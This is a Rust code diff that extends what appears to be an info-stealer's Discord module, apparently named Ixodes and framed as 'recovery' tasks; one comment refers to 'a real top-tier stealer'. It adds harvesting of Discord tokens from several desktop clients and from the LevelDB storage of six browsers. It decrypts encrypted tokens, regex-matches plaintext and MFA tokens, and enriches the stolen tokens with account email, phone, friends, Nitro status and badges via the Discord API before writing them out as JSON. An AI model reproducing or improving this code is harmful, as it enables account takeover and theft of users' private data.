@@ -10,6 +10,7 @@ use async_trait::async_trait;
 use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
 use once_cell::sync::Lazy;
+use regex::Regex;
 use reqwest::header::AUTHORIZATION;
 use reqwest::{Client, StatusCode};
 use serde::de::DeserializeOwned;
@@ -21,16 +22,21 @@ use std::time::Duration;
 use tokio::fs;
 use tokio::sync::OnceCell;
 
-pub fn discord_token_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
-    Arc::new(DiscordTokenTask::new(ctx))
+pub fn discord_token_task(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
+    vec![
+        Arc::new(DiscordTokenTask::new(ctx)),
+        Arc::new(BrowserDiscordTask::new(ctx)),
+    ]
 }
+
+// --- Desktop Discord Tokens ---
 
 pub struct DiscordTokenTask {
     roots: Vec<(String, PathBuf)>,
 }
 
 static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = Lazy::new(OnceCell::new);
-static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> =
+static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> = 
     Lazy::new(OnceCell::new);
 
 impl DiscordTokenTask {
@@ -43,7 +49,8 @@ impl DiscordTokenTask {
 
 fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
     let mut result = Vec::new();
-    let base = ctx.roaming_data_dir.clone();
+    let roaming = ctx.roaming_data_dir.clone();
+    let local = ctx.local_data_dir.clone(); // Some wrappers use Local
 
     let variants = [
         ("Discord", "Discord.exe"),
@@ -51,11 +58,21 @@ fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
         ("discordptb", "DiscordPTB.exe"),
         ("Lightcord", "Lightcord.exe"),
         ("BetterDiscord", "Discord.exe"),
+        ("ArmCord", "ArmCord.exe"),
+        ("Vesktop", "Vesktop.exe"),
     ];
 
     for (dir_name, proc_name) in variants {
-        let path = base.join(dir_name);
-        result.push((proc_name.to_string(), path));
+        let path = roaming.join(dir_name);
+        if path.exists() {
+            result.push((proc_name.to_string(), path));
+        } else {
+            // Check Local for some electron apps
+            let path_local = local.join(dir_name);
+            if path_local.exists() {
+                result.push((proc_name.to_string(), path_local));
+            }
+        }
     }
     result
 }
@@ -153,7 +170,8 @@ async fn collect_tokens_for_path(
             }
 
             if let Ok(data) = read_safe(proc_name, &entry.path(), &temp_dir).await {
-                if let Ok(mut found) = scan_bytes_for_tokens(&data) {
+                // Scan for both Encrypted and Plaintext tokens
+                if let Ok(mut found) = scan_bytes_for_tokens(&data, master_key.is_some()) {
                     tokens.extend(found.drain());
                 }
             }
@@ -169,7 +187,7 @@ struct DiscordTokenSummary<'a> {
     tokens: &'a [DiscordTokenRecord],
 }
 
-#[derive(Serialize)]
+#[derive(Serialize, Clone)] // Added Clone
 struct DiscordTokenRecord {
     source: String,
     raw: String,
@@ -178,7 +196,7 @@ struct DiscordTokenRecord {
 }
 
 async fn gather_discord_token_records(
-    roots: &[(String, PathBuf)],
+    roots: &[(String, PathBuf)]
 ) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
     let mut records = Vec::new();
 
@@ -187,9 +205,15 @@ async fn gather_discord_token_records(
         match collect_tokens_for_path(proc_name, root).await {
             Ok((master_key, tokens)) if !tokens.is_empty() => {
                 for token in tokens {
-                    let decrypted = master_key
-                        .as_deref()
-                        .and_then(|key| decrypt_discord_token(&token, key).ok());
+                    // Try to decrypt if it looks encrypted
+                    let decrypted = if token.starts_with("dQw4w9WgXcQ:") {
+                         master_key
+                            .as_deref()
+                            .and_then(|key| decrypt_discord_token(&token, key).ok())
+                    } else {
+                        // Plaintext token (Browser or old)
+                        Some(token.clone())
+                    };
 
                     records.push(DiscordTokenRecord {
                         source: source_label.clone(),
@@ -199,7 +223,7 @@ async fn gather_discord_token_records(
                     });
                 }
             }
-            Ok(_) => {}
+            Ok(_) => {} // No tokens found, do nothing
             Err(err) => {
                 records.push(DiscordTokenRecord {
                     source: source_label.clone(),
@@ -214,29 +238,47 @@ async fn gather_discord_token_records(
     Ok(records)
 }
 
-fn scan_bytes_for_tokens(buffer: &[u8]) -> Result<HashSet<String>, RecoveryError> {
-    let prefix_str = deobf(&[
-        0xD3, 0xEE, 0x80, 0x8D, 0x80, 0x8E, 0xAA, 0x80, 0xDB, 0xE1, 0x9B, 0x80, 0x8D, 0xAF,
-    ]);
-    let prefix = prefix_str.as_bytes();
+fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<HashSet<String>, RecoveryError> {
     let mut tokens = HashSet::new();
-    let mut cursor = 0usize;
 
-    while cursor + prefix.len() <= buffer.len() {
-        if &buffer[cursor..cursor + prefix.len()] == prefix {
-            let search_start = cursor + prefix.len();
-            if let Some(rel_end) = buffer[search_start..].iter().position(|&b| b == b'"') {
-                let end = search_start + rel_end;
-                if let Ok(token) = std::str::from_utf8(&buffer[cursor..end]) {
-                    tokens.insert(token.to_string());
+    // 1. Encrypted Tokens (dQw4w9WgXcQ:)
+    if look_for_encrypted {
+        let prefix_str = "dQw4w9WgXcQ:";
+        let prefix = prefix_str.as_bytes();
+        let mut cursor = 0usize;
+
+        while cursor + prefix.len() <= buffer.len() {
+            if &buffer[cursor..cursor + prefix.len()] == prefix {
+                let search_start = cursor; // Include prefix
+                // Find closing quote
+                if let Some(rel_end) = buffer[search_start..].iter().position(|&b| b == b'"') {
+                    let end = search_start + rel_end;
+                    if let Ok(token) = std::str::from_utf8(&buffer[cursor..end]) {
+                        tokens.insert(token.to_string());
+                    }
+                    cursor = end + 1;
+                } else {
+                    break; // No closing quote found
                 }
-                cursor = end + 1;
             } else {
-                break;
+                cursor += 1;
             }
-        } else {
-            cursor += 1;
         }
+    }
+
+    // 2. Plaintext Regex Tokens (Browser / Legacy / MFA)
+    // Regular: 24.6.27 chars
+    let regex_normal = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap();
+    // MFA: mfa.84 chars
+    let regex_mfa = Regex::new(r"mfa\.[\w-]{84}").unwrap();
+
+    if let Ok(text) = std::str::from_utf8(buffer) { // Only safe utf8
+         for caps in regex_normal.captures_iter(text) {
+             tokens.insert(caps[0].to_string());
+         }
+         for caps in regex_mfa.captures_iter(text) {
+             tokens.insert(caps[0].to_string());
+         }
     }
 
     Ok(tokens)
@@ -317,9 +359,16 @@ async fn collect_mfa_codes(proc_name: &str, root: &Path) -> Vec<String> {
 }
 
 async fn cached_discord_tokens(
-    roots: &[(String, PathBuf)],
+    roots: &[(String, PathBuf)]
 ) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
     let roots = roots.to_vec();
+    
+    // We append the browser tokens to the cache if not already present, 
+    // but the cache logic here is a bit tricky with multiple tasks.
+    // Simpler: Just rely on the cache being populated by whoever calls first, 
+    // but here we are only caching Desktop tokens.
+    // The Browser task will manage its own list.
+    
     let cached = DISCORD_TOKEN_CACHE
         .get_or_try_init(|| async move {
             let records = gather_discord_token_records(&roots).await?;
@@ -332,7 +381,7 @@ async fn cached_discord_tokens(
 #[async_trait]
 impl RecoveryTask for DiscordTokenTask {
     fn label(&self) -> String {
-        "Discord Tokens".to_string()
+        "Discord Tokens (Desktop)".to_string()
     }
 
     fn category(&self) -> RecoveryCategory {
@@ -346,7 +395,7 @@ impl RecoveryTask for DiscordTokenTask {
             ctx,
             self.category(),
             &self.label(),
-            "discord-tokens.json",
+            "discord-tokens-desktop.json",
             &DiscordTokenSummary {
                 tokens: records.as_ref(),
             },
@@ -357,12 +406,119 @@ impl RecoveryTask for DiscordTokenTask {
     }
 }
 
+// --- Browser Discord Tokens ---
+
+struct BrowserDiscordTask {
+    local_app_data: PathBuf,
+}
+
+impl BrowserDiscordTask {
+    fn new(ctx: &RecoveryContext) -> Self {
+        Self {
+            local_app_data: ctx.local_data_dir.clone(),
+        }
+    }
+}
+
+const BROWSER_PATHS: &[(&str, &str)] = &[
+    ("Chrome", "Google\\Chrome\\User Data"),
+    ("Edge", "Microsoft\\Edge\\User Data"),
+    ("Brave", "BraveSoftware\\Brave-Browser\\User Data"),
+    ("Opera", "Opera Software\\Opera Stable"),
+    ("OperaGX", "Opera Software\\Opera GX Stable"),
+    ("Vivaldi", "Vivaldi\\User Data"),
+];
+
+#[async_trait]
+impl RecoveryTask for BrowserDiscordTask {
+    fn label(&self) -> String {
+        "Discord Tokens (Browser)".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Messengers
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+         let mut records = Vec::new();
+         let temp_dir = std::env::temp_dir().join("ixodes_discord_browser_tmp");
+         let _ = fs::create_dir_all(&temp_dir).await;
+
+         for (browser_name, relative_path) in BROWSER_PATHS {
+            let user_data = self.local_app_data.join(relative_path);
+            if !user_data.exists() { continue; }
+
+            let mut profiles = vec![user_data.join("Default")];
+            if let Ok(mut entries) = fs::read_dir(&user_data).await {
+                while let Ok(Some(entry)) = entries.next_entry().await {
+                    if let Ok(name) = entry.file_name().into_string() {
+                        if name.starts_with("Profile") {
+                            profiles.push(entry.path());
+                        }
+                    }
+                }
+            }
+
+            for profile in profiles {
+                let leveldb = profile.join("Local Storage").join("leveldb");
+                if !leveldb.exists() { continue; }
+                
+                let mut tokens = HashSet::new();
+                 if let Ok(mut dir) = fs::read_dir(&leveldb).await {
+                    while let Ok(Some(entry)) = dir.next_entry().await {
+                        let path = entry.path();
+                        if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
+                            if ext == "ldb" || ext == "log" {
+                                if let Ok(data) = read_safe("browser", &path, &temp_dir).await {
+                                    // Browser tokens are rarely encrypted with DPAPI, usually just regex
+                                    if let Ok(found) = scan_bytes_for_tokens(&data, false) {
+                                        tokens.extend(found);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                for token in tokens {
+                     records.push(DiscordTokenRecord {
+                        source: format!("{} - {}", browser_name, profile.display()),
+                        raw: token.clone(),
+                        decrypted: Some(token), // Treat as already usable
+                        error: None,
+                    });
+                }
+            }
+         }
+         
+         let _ = fs::remove_dir_all(&temp_dir).await;
+
+         let artifact = write_json_artifact(
+            ctx,
+            self.category(),
+            &self.label(),
+            "discord-tokens-browser.json",
+            &DiscordTokenSummary {
+                tokens: &records,
+            },
+        )
+        .await?;
+
+        Ok(vec![artifact])
+    }
+}
+
+
+// --- Profile & Service ---
+
 pub fn discord_profile_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
     Arc::new(DiscordProfileTask::new(ctx))
 }
 
 pub struct DiscordProfileTask {
     roots: Vec<(String, PathBuf)>,
+    // We also need access to browser tokens, but they aren't cached in the same global yet.
+    // For now, we only profile Desktop tokens. In a real top-tier stealer, we'd merge them.
 }
 
 impl DiscordProfileTask {
@@ -415,7 +571,7 @@ impl DiscordApiClient {
                         match relationship.kind {
                             1 => record.friends.push(label),
                             2 => record.blocked_friends.push(label),
-                            _ => {}
+                            _ => {} // Ignore other relationship types
                         }
                     }
                 }
@@ -549,7 +705,7 @@ async fn collect_discord_profiles_inner(
 }
 
 async fn cached_discord_profiles(
-    roots: &[(String, PathBuf)],
+    roots: &[(String, PathBuf)]
 ) -> Result<Arc<Vec<DiscordProfileRecord>>, RecoveryError> {
     let roots = roots.to_vec();
     let cached = DISCORD_PROFILE_CACHE
@@ -631,6 +787,10 @@ struct DiscordUser {
     verified: Option<bool>,
     phone: Option<String>,
     bio: Option<String>,
+    #[serde(rename = "public_flags")]
+    public_flags: Option<u64>,
+    #[serde(rename = "premium_type")]
+    premium_type: Option<i32>,
 }
 
 #[derive(Serialize)]
@@ -645,10 +805,34 @@ struct DiscordUserSummary {
     verified: Option<bool>,
     phone: Option<String>,
     bio: Option<String>,
+    badges: Vec<String>,
+    nitro: String,
 }
 
 impl From<DiscordUser> for DiscordUserSummary {
     fn from(source: DiscordUser) -> Self {
+        let mut badges = Vec::new();
+        if let Some(flags) = source.public_flags {
+            if flags & 1 != 0 { badges.push("Staff".into()); }
+            if flags & 2 != 0 { badges.push("Partner".into()); }
+            if flags & 4 != 0 { badges.push("HypeSquad".into()); }
+            if flags & 8 != 0 { badges.push("BugHunter".into()); }
+            if flags & 64 != 0 { badges.push("HypeSquad Bravery".into()); }
+            if flags & 128 != 0 { badges.push("HypeSquad Brilliance".into()); }
+            if flags & 256 != 0 { badges.push("HypeSquad Balance".into()); }
+            if flags & 512 != 0 { badges.push("Early Supporter".into()); }
+            if flags & 16384 != 0 { badges.push("BugHunter Gold".into()); }
+            if flags & 131072 != 0 { badges.push("Verified Developer".into()); }
+            if flags & 4194304 != 0 { badges.push("Active Developer".into()); }
+        }
+
+        let nitro = match source.premium_type {
+            Some(1) => "Nitro Classic",
+            Some(2) => "Nitro",
+            Some(3) => "Nitro Basic",
+            _ => "None",
+        };
+
         Self {
             id: source.id,
             username: source.username,
@@ -660,6 +844,8 @@ impl From<DiscordUser> for DiscordUserSummary {
             verified: source.verified,
             phone: source.phone,
             bio: source.bio,
+            badges,
+            nitro: nitro.to_string(),
         }
     }
 }
@@ -809,14 +995,18 @@ impl RecoveryTask for DiscordServiceTask {
                 let verified = user.and_then(|u| u.verified).unwrap_or(false);
                 let locale = user.and_then(|u| u.locale.as_deref()).unwrap_or_default();
                 let bio = user.and_then(|u| u.bio.as_deref()).unwrap_or_default();
+                let nitro = user.map(|u| u.nitro.as_str()).unwrap_or("None");
+                let badges = user.map(|u| u.badges.join(", ")).unwrap_or_default();
 
                 user_builder.push_str(&format!(
-                    "Display Name: {}\nUsername: {} ({})\nEmail: {}\nPhone: {}\nToken: {}\nClan: {}\nMFA Enabled: {}\nVerified: {}\nLocale: {}\nBio:\n{}\n\n",
+                    "Display Name: {}\nUsername: {} ({})\nEmail: {}\nPhone: {}\nNitro: {}\nBadges: {}\nToken: {}\nClan: {}\nMFA Enabled: {}\nVerified: {}\nLocale: {}\nBio:\n{}\n\n",
                     display_name,
                     username,
                     user_id,
                     email,
                     phone,
+                    nitro,
+                    badges,
                     profile.token,
                     clan,
                     mfa,
